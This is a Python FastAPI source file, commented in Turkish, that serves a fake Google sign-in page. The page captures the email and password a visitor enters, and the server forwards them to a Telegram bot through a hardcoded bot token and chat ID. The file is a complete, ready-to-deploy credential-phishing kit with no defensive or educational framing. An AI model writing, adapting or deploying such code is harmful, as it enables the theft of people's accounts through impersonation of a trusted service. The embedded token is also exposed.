from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests  # httpx yerine requests kullan

app = FastAPI()

# --- BURAYA KENDİ BİLGİLERİNİ YAZ ---
BOT_TOKEN = "8645926434:AAGMsVWcrZ-Str1WSwPae7QIgaS3diAkDQo"  # BotFather'dan aldığın token
CHAT_ID = "8359722718"      # @userinfobot'tan aldığın sayı
# --------------------------------------

# HTML şablonu (AYNI, DEĞİŞMEDİ)
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { font-size: 28px; font-weight: 500; margin-bottom: 20px; color: #3c4043; }
        .logo span { color: #4285f4; }
        .title { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 24px; }
        .subtitle a { color: #1a73e8; text-decoration: none; }
        .subtitle a:hover { text-decoration: underline; }
        .input-group { text-align: left; margin-bottom: 16px; }
        .input-group label { display: block; font-size: 14px; color: #5f6368; margin-bottom: 4px; }
        .input-group input { width: 100%; padding: 12px 14px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border 0.2s; }
        .input-group input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2); }
        .forgot-email { text-align: left; margin-bottom: 16px; }
        .forgot-email a { color: #1a73e8; text-decoration: none; font-size: 14px; }
        .forgot-email a:hover { text-decoration: underline; }
        .create-account { text-align: left; margin-bottom: 24px; }
        .create-account a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .create-account a:hover { text-decoration: underline; }
        .button-container { display: flex; justify-content: flex-end; }
        .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
        .btn-next:hover { background: #1b66c9; }
        .step-2 { display: none; }
        .step-1 { display: block; }
        .password-options { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
        .password-options label { font-size: 14px; color: #5f6368; display: flex; align-items: center; gap: 6px; }
        .password-options a { color: #1a73e8; text-decoration: none; font-size: 14px; }
        .password-options a:hover { text-decoration: underline; }
        .error-message { color: #d93025; font-size: 13px; margin-top: 6px; display: none; text-align: left; }
    </style>
</head>
<body>
    <div class="container">
        <div id="step1" class="step-1">
            <div class="logo">G<span>o</span><span style="color:#ea4335;">o</span><span style="color:#fbbc04;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span></div>
            <div class="title">Oturum açın</div>
            <div class="subtitle">Google Hesabınızı kullanın. Hesap bu cihaza eklenir ve diğer Google uygulamaları tarafından kullanılabilir.<br><a href="#">Hesabınızı kullanma hakkında daha fazla bilgi</a></div>
            <div class="input-group">
                <label for="emailPhone">E-posta veya telefon</label>
                <input type="text" id="emailPhone" placeholder="E-posta veya telefon">
                <div id="emailError" class="error-message">Lütfen geçerli bir e-posta veya telefon numarası girin.</div>
            </div>
            <div class="forgot-email"><a href="#">E-posta adresinizi mi unuttunuz?</a></div>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <div class="create-account"><a href="#">Hesap oluşturun</a></div>
                <div class="button-container"><button class="btn-next" onclick="goToStep2()">Sonraki</button></div>
            </div>
        </div>
        <div id="step2" class="step-2">
            <div class="logo">G<span>o</span><span style="color:#ea4335;">o</span><span style="color:#fbbc04;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span></div>
            <div class="title">Hoş geldiniz</div>
            <div id="displayEmail" style="font-size: 16px; color: #202124; margin-bottom: 16px; font-weight: 500;"></div>
            <div class="input-group">
                <label for="password">Şifrenizi girin</label>
                <input type="password" id="password" placeholder="Şifrenizi girin">
                <div id="passwordError" class="error-message">Lütfen şifrenizi girin.</div>
            </div>
            <div class="password-options">
                <label><input type="checkbox" id="showPassword" onchange="togglePassword()"> Şifreyi göster</label>
                <a href="#">Başka bir yöntem dene</a>
            </div>
            <div style="display: flex; justify-content: flex-end; margin-top: 24px;">
                <button class="btn-next" onclick="sendToTelegram()">Sonraki</button>
            </div>
        </div>
    </div>
    <script>
        function goToStep2() {
            const email = document.getElementById('emailPhone').value.trim();
            const errorDiv = document.getElementById('emailError');
            if (email === '') { errorDiv.style.display = 'block'; return; }
            errorDiv.style.display = 'none';
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            document.getElementById('displayEmail').innerText = email;
        }
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const showCheckbox = document.getElementById('showPassword');
            passwordInput.type = showCheckbox.checked ? 'text' : 'password';
        }
        function sendToTelegram() {
            const email = document.getElementById('displayEmail').innerText;
            const password = document.getElementById('password').value.trim();
            const errorDiv = document.getElementById('passwordError');
            if (password === '') { errorDiv.style.display = 'block'; return; }
            errorDiv.style.display = 'none';
            fetch('/send-to-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: email, password: password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('✅ Bilgileriniz gönderildi!');
                    document.getElementById('emailPhone').value = '';
                    document.getElementById('password').value = '';
                    document.getElementById('step2').style.display = 'none';
                    document.getElementById('step1').style.display = 'block';
                } else {
                    alert('❌ Hata: ' + data.message);
                }
            })
            .catch(error => {
                alert('❌ Bağlantı hatası!');
                console.error('Hata:', error);
            });
        }
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                const step1 = document.getElementById('step1');
                const step2 = document.getElementById('step2');
                if (step1.style.display !== 'none') { goToStep2(); }
                else if (step2.style.display !== 'none') { sendToTelegram(); }
            }
        });
    </script>
</body>
</html>"""

@app.get("/", response_class=HTMLResponse)
async def get_index():
    return HTML_TEMPLATE

@app.post("/send-to-telegram")
async def send_to_telegram(request: Request):
    try:
        data = await request.json()
        email = data.get("email")
        password = data.get("password")
        
        message = f"🔐 Yeni Giriş Bilgileri:\n\n📧 E-posta: {email}\n🔑 Şifre: {password}"
        
        # Telegram'a gönder (requests kullanarak)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, json=payload)
        
        if response.status_code == 200:
            return {"success": True, "message": "Gönderildi"}
        else:
            # Hata detayını döndür
            return {"success": False, "message": f"Telegram hatası: {response.text}"}
            
    except Exception as e:
        return {"success": False, "message": f"Sunucu hatası: {str(e)}"}
